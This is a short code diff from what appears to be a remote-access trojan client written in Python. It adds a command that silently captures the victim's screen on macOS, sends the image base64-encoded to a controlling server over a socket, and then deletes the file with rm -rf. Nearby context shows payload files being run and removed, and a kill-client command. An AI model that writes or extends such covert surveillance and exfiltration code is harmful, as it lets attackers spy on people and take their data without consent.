@@ -422,6 +422,15 @@ def start_server():
 
                 send_response(server_socket, output)
                 execute_command("rm -rf {0}".format(payload_file))
+            elif command == "screenshot":
+                screenshot_file = "/tmp/screenshot.jpg"
+
+                execute_command("screencapture -x {0}".format(screenshot_file))
+
+                with open(screenshot_file, "rb") as open_file:
+                    send_response(server_socket, base64.b64encode(open_file.read()))
+
+                execute_command("rm -rf {0}".format(screenshot_file))
             elif command == "kill_client":
                 send_response(server_socket, "Farewell.")
                 kill_client(is_root())
